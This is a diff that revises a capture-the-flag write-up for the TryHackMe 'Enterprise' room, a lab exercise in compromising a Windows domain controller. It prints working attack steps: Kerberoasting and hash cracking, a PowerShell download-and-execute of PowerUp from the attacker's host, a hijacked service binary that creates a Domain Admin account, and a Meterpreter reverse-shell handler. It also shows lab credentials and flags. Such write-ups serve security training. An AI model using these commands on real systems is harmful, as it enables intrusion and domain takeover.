@@ -1,30 +1,23 @@
 # TryHackMe — Enterprise
 
-**Room:** Enterprise
-**Difficulty:** Hard
-**Operating System:** Windows
-**Made by:** @tryhackme
+**Room:** Enterprise | **Difficulty:** Hard | **OS:** Windows
 **Tags:** `Active Directory` `Kerberoasting` `OSINT` `GitHub` `Unquoted Service Path` `BloodHound` `Service Hijacking`
 
 ---
 
-> **A note before we start:** Same deal as always — full black-box methodology, not just the commands that worked. The rabbit holes are in here too, because that is half the job.
+## ![Room Banner](./assets/0.png)
 
 ---
 
-![Local Image](./assets/Enterprise.png)
+## Overview
 
----
-
-## Context
-
-You just landed in an internal network. You scan the network and there is only the Domain Controller. Your objective: full domain compromise.
+A black-box Active Directory engagement against a single Domain Controller. The attack chain spans OSINT, credential recovery from Git history, Kerberoasting, and local privilege escalation via an unquoted service path — culminating in full domain compromise. Rabbit holes are documented where they informed the methodology.
 
 ---
 
 ## Phase 1 — Reconnaissance
 
-### Start with Nmap
+### Nmap Full-Port Scan
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -63,15 +56,7 @@ Host script results:
 |_    Message signing enabled and required
 ```
 
-### Reading the Scan
-
-This is a full Domain Controller — Kerberos on 88, LDAP on 389 and 636, Global Catalog on 3268/3269, the whole suite. The RDP banner is particularly generous, leaking the full AD structure: machine name `LAB-DC`, domain `LAB.ENTERPRISE.THM`, and forest root `ENTERPRISE.THM`. We are dealing with a subdomain inside a larger forest.
-
-SMBv3 with signing required — relay attacks are off the table, same story as always on these rooms.
-
-Two web ports are open. Port 80 IIS and port **7990** which Nmap already fingerprinted as an **Atlassian login page**. That one is going on the list to revisit. WinRM is also open on 5985.
-
-Updating `/etc/hosts` with both the subdomain and the forest root — useful if there are cross-domain trust relationships to explore later:
+**Key takeaways:** The RDP NTLM banner leaks the full AD topology — machine `LAB-DC`, child domain `LAB.ENTERPRISE.THM`, forest root `ENTERPRISE.THM`. SMB signing is enforced, ruling out relay attacks. Port 7990 (Atlassian Bitbucket) is flagged as a high-priority target. WinRM is present on 5985.
 
 ```
 10.112.151.187  LAB-DC.LAB.ENTERPRISE.THM  LAB.ENTERPRISE.THM  ENTERPRISE.THM
@@ -81,7 +66,7 @@ Updating `/etc/hosts` with both the subdomain and the forest root — useful if 
 
 ## Phase 2 — SMB & LDAP Enumeration
 
-### First — enum4linux-ng
+### Null Session Probe
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -99,9 +84,7 @@ Updating `/etc/hosts` with both the subdomain and the forest root — useful if 
 [+] Found 0 shares for user '' with password ''
 ```
 
-Null session partially works — anonymous bind succeeds, we get the domain name and SID, but every deeper RPC call comes back `STATUS_ACCESS_DENIED`. Classic hardened DC behavior.
-
-### Checking LDAP
+Anonymous LDAP bind succeeds and reveals the forest/domain structure; deeper RPC calls are blocked.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -116,11 +99,9 @@ namingcontexts: DC=LAB,DC=ENTERPRISE,DC=THM
 namingcontexts: DC=DomainDnsZones,DC=LAB,DC=ENTERPRISE,DC=THM
 ```
 
-This confirms the forest structure cleanly: `ENTERPRISE.THM` is the forest root, `LAB.ENTERPRISE.THM` is the child domain we are operating in. Good to know for later.
+### SMB Share Enumeration
 
-### The SMB Share Quirk Worth Knowing
-
-CrackMapExec reported zero shares with a null session:
+CrackMapExec reported no shares via null session (it uses the SAMR/RPC path, which is blocked). Falling back to `smbclient`, which bypasses this restriction by using the SMB protocol directly:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -128,8 +109,6 @@ CrackMapExec reported zero shares with a null session:
 SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\:
 SMB  10.112.151.187  445  LAB-DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
 ```
-
-But not trusting that — CrackMapExec uses RPC/SAMR internally to enumerate shares, which gets blocked by the same policy that denied our user/group enumeration. Let's try `smbclient` directly, which uses a different code path:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -146,13 +125,11 @@ But not trusting that — CrackMapExec uses RPC/SAMR internally to enumerate sha
     Users           Disk      Users Share. Do Not Touch!
 ```
 
-There they are. `Docs` and a `Users` share with a suspiciously defensive description. Let's look at both.
-
 ---
 
-## Phase 3 — SMB Share Enumeration (Rabbit Holes)
+## Phase 3 — Share Analysis
 
-### The Docs Share
+### Docs Share
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -165,11 +142,9 @@ smb: \> prompt off
 smb: \> mget *
 ```
 
-Both files are password protected. Tried John against the encryption metadata — do not bother. Modern Office files (2013+) use **PBKDF2-SHA256 with 100,000 iterations** per guess. That drops cracking speed from millions of attempts per second down to roughly 10-20 per second. rockyou.txt would take years. This is a rabbit hole, moving on.
+Both files are encrypted with modern Office encryption (PBKDF2-SHA256, 100,000 iterations). At ~10–20 guesses/second, a wordlist attack is not viable. Deprioritised.
 
-### The Users Share
-
-"Do Not Touch!" they said.
+### Users Share — PSReadLine History
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -183,23 +158,19 @@ smb: \> ls
   Public           D
 ```
 
-Browsing through the user directories, there is something worth knowing about Windows environments in general: PowerShell keeps a command history file at `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. This file persists across sessions and is readable if you have share access.
-
-Inside `LAB-ADMIN`'s history:
+Windows persists PowerShell command history at `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. Browsing `LAB-ADMIN`'s profile revealed:
 
 ```
 echo "replication:101RepAdmin123!!" > private.txt
 ```
 
-Tried these creds. Useless. Another rabbit hole.
-
-The important find here though is the username list the directory structure gives us: `Administrator`, `atlbitbucket`, `bitbucket`, `LAB-ADMIN`. These are real accounts on this machine.
+Credentials did not authenticate — rabbit hole. The share structure itself, however, yielded a useful username list: `Administrator`, `atlbitbucket`, `bitbucket`, `LAB-ADMIN`.
 
 ---
 
-## Phase 4 — Kerbrute & AS-REP Roasting (Nothing, but Worth Doing)
+## Phase 4 — Username Enumeration & AS-REP Roasting
 
-With a username list building up, let's run Kerbrute to confirm valid domain accounts:
+### Kerbrute
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -217,7 +188,7 @@ With a username list building up, let's run Kerbrute to confirm valid domain acc
 [+] VALID USERNAME: joiner
 ```
 
-Then immediately checked the list for AS-REP roastable accounts:
+### AS-REP Roasting
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -227,7 +198,7 @@ Then immediately checked the list for AS-REP roastable accounts:
 # ... (same for all)
 ```
 
-Nothing. Every account has Kerberos pre-authentication enabled. Let's move on to the web services.
+All accounts have Kerberos pre-authentication enabled. No AS-REP hashes obtainable. Pivoting to web services.
 
 ---
 
@@ -235,39 +206,37 @@ Nothing. Every account has Kerberos pre-authentication enabled. Let's move on to
 
 ### Port 80
 
-Fuzzing and manual browsing — completely empty. Nothing interesting on port 80.
+No content of interest found via fuzzing or manual browsing.
 
 ### Port 7990 — Atlassian Bitbucket
 
-This is the one. The login page has a notice:
+The Bitbucket login page displayed a notice:
 
 ```
 Reminder to all Enterprise-THM Employees:
 We are moving to GitHub
 ```
 
-That is an OSINT lead. If they are moving to GitHub, there is likely already a GitHub organisation. I searched for `Enterprise-THM` on GitHub — and there it is. A real organisation with repositories and members.
+This is an actionable OSINT lead. Searching GitHub for `Enterprise-THM` surfaced a live organisation.
 
-## ![Local Image](./assets/1.png)
+## ![GitHub Organisation](./assets/1.png)
 
-Checking the member list: one of the contributors is `Nik-enterprise-dev`. We already confirmed `nik` as a valid domain account from Kerbrute. This person is real.
+One contributor is listed as `Nik-enterprise-dev` — corroborating `nik` as a valid domain account confirmed by Kerbrute.
 
-## ![Local Image](./assets/2.png)
+## ![GitHub Member](./assets/2.png)
 
-Browsing their repositories, there is an admin automation script — and here is where someone is going to have a bad day at work.
+Reviewing the organisation's repositories, an admin automation script was identified.
 
-## ![Local Image](./assets/3.png)
+## ![Repository](./assets/3.png)
 
-Checking the **commit history** of that file reveals a previous version where the credentials were committed in plaintext before being removed:
+Inspecting the **commit history** of that script revealed credentials committed in plaintext in a prior revision before being scrubbed:
 
-## ![Local Image](./assets/4.png)
+## ![Commit History](./assets/4.png)
 
 ```powershell
 $userName = 'nik'
 $userPassword = 'ToastyBoi!'
 ```
-
-Oopsie. Someone is going to get fired.
 
 ---
 
@@ -281,11 +250,7 @@ Oopsie. Someone is going to get fired.
 SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\nik:ToastyBoi!
 ```
 
-Valid credentials. No `Pwn3d!` — standard domain user. Can't use psexec or wmiexec without admin rights.
-
-Checked groups — the `Remote Management Users` group is empty. WinRM access exists on the system but nobody is in the group. That port is there just to waste our time apparently.
-
-But the `Remote Desktop Users` group:
+Valid — standard domain user, no local admin. WinRM access confirmed empty `Remote Management Users` group. Checking `Remote Desktop Users`:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -293,11 +258,9 @@ But the `Remote Desktop Users` group:
 SMB  10.112.151.187  445  LAB-DC  LAB.ENTERPRISE.THM\bitbucket
 ```
 
-`bitbucket` can RDP. Now we have a target.
+`bitbucket` has RDP access — a concrete escalation target.
 
-### Kerberoasting — Let's Find SPNs
-
-With valid credentials, let's check for Kerberoastable accounts:
+### Kerberoasting
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -312,7 +275,7 @@ HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,...
 $krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$28e7ff42f235...
 ```
 
-`bitbucket` has an SPN registered — `HTTP/LAB-DC` — which means we can request a TGS ticket for it and attempt to crack it offline. Also notice it is a member of `sensitive-account`. That is worth keeping in mind.
+`bitbucket` has a registered SPN (`HTTP/LAB-DC`) and is a member of `sensitive-account`. TGS ticket obtained for offline cracking.
 
 ### Cracking the TGS Hash
 
@@ -321,15 +284,13 @@ $krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$28e7ff42
 └─$ hashcat -m 13100 service.hash /usr/share/wordlists/rockyou.txt
 ```
 
-Password: `littleredbucket`
+Recovered password: `littleredbucket`
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
 └─$ crackmapexec smb 10.112.151.187 -u 'bitbucket' -p 'littleredbucket'
 SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket
 ```
-
-Valid. Still no `Pwn3d!` — but we know `bitbucket` can RDP.
 
 ---
 
@@ -340,15 +301,13 @@ Valid. Still no `Pwn3d!` — but we know `bitbucket` can RDP.
 └─$ xfreerdp /v:10.112.151.187 /u:bitbucket /p:'littleredbucket' /d:LAB.ENTERPRISE.THM /cert:ignore /sec:nla
 ```
 
-We are in. Flag 1 is sitting on the desktop:
+Interactive session established. Flag 1 recovered from the desktop.
 
 **Flag 1:** `THM{ed882d02b34246536ef7da79062bef36}`
 
 ---
 
-## Phase 8 — BloodHound
-
-With two owned accounts now — `nik` and `bitbucket` — let's map the domain:
+## Phase 8 — Domain Mapping with BloodHound
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -361,54 +320,40 @@ With two owned accounts now — `nik` and `bitbucket` — let's map the domain:
 └─$ /opt/BloodHound-linux-x64/BloodHound --no-sandbox
 ```
 
-Upload and mark both accounts as owned.
+## ![BloodHound Graph](./assets/5.png)
 
-## ![Local Image](./assets/5.png)
-
-The graph tells a limited story — no direct privilege escalation path through AD permissions for either account. BloodHound does confirm what we already knew: `bitbucket` has `CanRDP` to `LAB-DC` and is a member of `sensitive-account`. The `Administrator` account has an active session on `LAB-DC` too, which is visible in the graph.
-
-> _Screenshot — BloodHound: bitbucket CanRDP to LAB-DC, Administrator HasSession, MemberOf Domain Admins_ > `[screenshot-bloodhound-canrdp-session.png]`
-
-Since there is no obvious AD ACL path to exploit, we need to look at the local machine itself. Time to enumerate privilege escalation vectors on the host.
+BloodHound confirmed `bitbucket`'s `CanRDP` edge to `LAB-DC` and an active `Administrator` session on the DC. No exploitable ACL path existed through AD permissions alone. The attack surface shifted to the local host.
 
 ---
 
-## Phase 9 — Local Privilege Escalation via Unquoted Service Path
+## Phase 9 — Local Privilege Escalation: Unquoted Service Path
 
-### PowerUp — Loading in Memory
+### Loading PowerUp In-Memory
 
 ```bash
 # On Kali — serve PowerUp
 python3 -m http.server 80
 ```
 
-On the RDP session in PowerShell, we load it directly into memory — no file touching the disk:
-
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.129.39:80/PowerUp.ps1')
 Invoke-AllChecks
 ```
 
-PowerUp returns several findings. The most interesting ones — trimming the noise:
+PowerUp identified the `zerotieroneservice` as exploitable on two vectors simultaneously:
 
-The `zerotieroneservice` service shows up multiple times with two different vulnerability classes:
-
-- **Unquoted Service Path:** The binary path `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe` contains spaces and is not quoted. Windows will attempt to resolve the binary by trying progressively shorter paths — meaning a binary named `Zero.exe` placed in `C:\Program Files (x86)\Zero Tier\` will get executed instead of the real one.
-- **Modifiable Service Binary:** `BUILTIN\Users` has write permissions directly on the service executable itself.
-- **StartName: LocalSystem** — the service runs as `NT AUTHORITY\SYSTEM`.
-- **CanRestart: True** — we can stop and start the service ourselves without admin rights.
-
-That last point is what makes this exploitable without a reboot trigger. We have everything we need.
+- **Unquoted Service Path:** Binary path `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe` is unquoted and space-delimited. Windows path resolution will execute `C:\Program Files (x86)\Zero Tier\Zero.exe` if present.
+- **Modifiable Service Binary:** `BUILTIN\Users` holds write permissions on the service executable directly.
+- **StartName: LocalSystem** — execution context is `NT AUTHORITY\SYSTEM`.
+- **CanRestart: True** — the service can be stopped and started without administrator rights, enabling immediate exploitation without requiring a reboot.
 
 ---
 
-## Phase 10 — Service Hijack: Two Methods
+## Phase 10 — Service Hijack: Exploitation
 
-### Method 1 — Persistence: Add a Domain Admin
+### Method 1 — Persistent Domain Admin via Service Binary
 
-The cleanest approach for persistence: craft a service binary that runs a `net user` and `net group` command to add a new account directly into Domain Admins. Running as SYSTEM on a DC means those commands execute with full domain authority.
-
-On Kali:
+Craft a service-format binary that executes domain account creation commands. Since the service runs as SYSTEM on a Domain Controller, `net user` and `net group` commands execute with full domain authority.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -420,15 +365,11 @@ Saved as: Zero.exe
 python3 -m http.server 80
 ```
 
-On the RDP PowerShell session:
-
 ```powershell
 PS C:\Users\bitbucket> wget "192.168.129.39:80/Zero.exe" -OutFile "C:\Program Files (x86)\Zero Tier\Zero.exe"
 Stop-Service zerotieroneservice
 Start-Service zerotieroneservice
 ```
-
-Confirming the result:
 
 ```powershell
 PS C:\Users\bitbucket> net user hacker /domain
@@ -444,13 +385,13 @@ The command completed successfully.
 SMB  10.112.151.187  445  LAB-DC  [+] LAB.ENTERPRISE.THM\hacker:Password123! (Pwn3d!)
 ```
 
-`Pwn3d!` — Domain Admin confirmed.
+Domain compromised.
 
 ---
 
 ### Method 2 — Interactive SYSTEM Shell via Meterpreter
 
-If you want an interactive shell instead, craft a Meterpreter payload and drop it as the hijack binary:
+For an interactive session, a staged Meterpreter payload is dropped as the hijack binary.
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -459,7 +400,7 @@ Payload size: 511 bytes
 Final size of exe file: 7680 bytes
 ```
 
-In Metasploit, set up the handler — **critically important**: set `InitialAutoRunScript` to auto-migrate immediately after the session opens. The service binary gets killed when the service stops, so without migration the session dies almost instantly:
+`InitialAutoRunScript` is set to auto-migrate immediately on session open. This is critical: without process migration, the session dies when the service binary terminates after start.
 
 ```
 msf > use multi/handler
@@ -469,13 +410,11 @@ msf exploit(multi/handler) > set InitialAutoRunScript post/windows/manage/migrat
 msf exploit(multi/handler) > run
 ```
 
-Download and stage the binary on the RDP session, then restart the service. Meterpreter catches the connection, auto-migrates to a stable process, and you have a full interactive `NT AUTHORITY\SYSTEM` shell on the DC.
+Service restart triggers execution, Meterpreter migrates to a stable process, yielding a persistent `NT AUTHORITY\SYSTEM` shell on the DC.
 
 ---
 
-## Phase 11 — Grabbing the Final Flag
-
-With Domain Admin access:
+## Phase 11 — Final Flag
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Enterprise]
@@ -486,18 +425,29 @@ With Domain Admin access:
 
 ---
 
-## Closing Thoughts
+## Attack Chain Summary
 
-This room earns its Hard rating honestly. The path to initial credentials is not technical — it is OSINT. A GitHub organisation, a commit history, a developer who forgot to scrub their credentials before pushing. That is not a CTF gimmick. That happens in real engagements constantly, and it is often the fastest way into a network.
-
-The privilege escalation through the unquoted service path is a classic but the `CanRestart: True` flag is what makes it clean. Without the ability to restart the service yourself, you are waiting for a reboot or hoping someone else triggers it. Having that permission turns a theoretical finding into an immediate win.
-
-Thanks for reading.
+| Phase           | Technique                            | Outcome                                      |
+| --------------- | ------------------------------------ | -------------------------------------------- |
+| Reconnaissance  | Nmap full-port scan                  | DC topology, domain structure, open services |
+| SMB Enumeration | smbclient null session               | Accessible shares, username list             |
+| OSINT           | GitHub organisation + commit history | Plaintext credentials for `nik`              |
+| Kerberoasting   | GetUserSPNs + Hashcat                | Credentials for `bitbucket`                  |
+| RDP Access      | xfreerdp                             | Interactive session, Flag 1                  |
+| Domain Mapping  | BloodHound                           | No ACL path; pivoted to local PrivEsc        |
+| PrivEsc         | Unquoted service path + CanRestart   | SYSTEM execution on DC                       |
+| Persistence     | Service binary hijack                | New Domain Admin account, Flag 2             |
 
 ---
 
-_Raw .md file available on GitHub: [https://github.com/MohamedTaherBorgi/Writeups](https://github.com/MohamedTaherBorgi/Writeups)_
+## Key Takeaways
+
+The initial access vector here — credentials embedded in a Git commit history — is not a CTF-specific contrivance. It reflects a common real-world failure: secrets are removed from the current state of a repository but remain accessible in its history. The OSINT pivot from an internal Bitbucket notice to a GitHub organisation search is the kind of lateral thinking that separates methodical enumeration from checklist execution.
+
+The privilege escalation chain illustrates how two compounding misconfigurations — an unquoted service path and `CanRestart` rights for unprivileged users — convert a theoretical finding into an immediate, reliable exploit without requiring any reboot dependency.
 
 ---
 
-**Tags:** `TryHackMe` `Active Directory` `Kerberoasting` `OSINT` `GitHub` `Unquoted Service Path` `PowerUp` `Meterpreter` `Service Hijacking`
+_Writeup repository: [https://github.com/MohamedTaherBorgi/Writeups](https://github.com/MohamedTaherBorgi/Writeups)_
+
+**Tags:** `TryHackMe` `Active Directory` `Kerberoasting` `OSINT` `GitHub` `Unquoted Service Path` `PowerUp` `Meterpreter` `Service Hijacking` `BloodHound`
